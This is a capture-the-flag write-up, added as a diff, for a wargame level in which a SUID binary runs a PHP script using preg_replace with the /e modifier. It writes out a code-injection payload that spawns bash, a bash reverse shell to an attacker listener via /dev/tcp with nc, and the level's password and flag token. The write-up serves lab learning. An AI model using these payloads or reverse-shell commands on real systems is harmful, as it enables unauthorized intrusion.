@@ -1,0 +1,62 @@
+login/pw:
+	level06 : viuaaale9huek52boumoomioc
+
+RESOLUTION:
+	ls -l
+		=> -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
+		=> -rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
+			=> SUID flag06
+				=> Reverse Engineering
+	scp -P 4242 level06@192.168.1.23:~/level06 .
+	scp -P 4242 level06@192.168.1.23:~/level06.php .
+	bash script.sh
+		=> New project
+			=> Analyze /level06
+				=> execve("/usr/bin/php",&local_34,__envp)
+					=> Executes php on level06.php
+	./level06
+		=> PHP Warning:  file_get_contents(): Filename cannot be empty 
+	./level06 a
+		=> file_get_contents(a): failed to open stream: No such file or directory
+
+	Host:
+		php level06.php level06.php
+			=> PHP Warning:  preg_replace(): The /e modifier is no longer supported
+	php /e modifier
+		If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, evals it as PHP code(!!), and uses the result for replacing the search string.
+		Deprecated since php5.5
+		Backreferences
+			=> A backslash followed by a digit greater than 0 is a back reference to a capturing subpattern earlier (i.e. to its left) in the pattern, provided there have been that many previous capturing left parentheses. 
+		
+		docker run -it -v `pwd`:/level06 nimmis/apache-php5 bash
+		Test1 - e modifier example
+			php /level06/test1.php
+				=> AbcAbc
+					=> strtoupper is evaluated as php code
+		level06.php
+			cat level06.php
+				=> preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)
+					=> Calls y() on second bracket (.*) => eval(y(.*))
+		Test2 - Reproduce level06.php pattern
+			https://www.php.net/manual/fr/language.types.string.php#language.types.string.parsing.complex
+			php /level06/test2.php
+				=> pwd is executed
+						
+	Remote:
+		Lets match "/(\[x (.*)\])/e"				
+		As we know eval(y(.*)) will occur (.*) being the one from the regex
+		echo '[x {${exec(bash)}}]' > /tmp/bash.php
+			=> We could just use getflag but a shell is always funnier
+			=> Note that the output is not redirected that's why we set up a reverse shell
+		./level06 /tmp/bash.php
+	
+	Host:
+		ifconfig | grep inet
+			=> 192.168.1.61
+		nc -lvp 1234
+	
+	Remote:
+		bash -i >& /dev/tcp/192.168.1.61/1234 0>&1
+
+	getflag:
+		=> Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
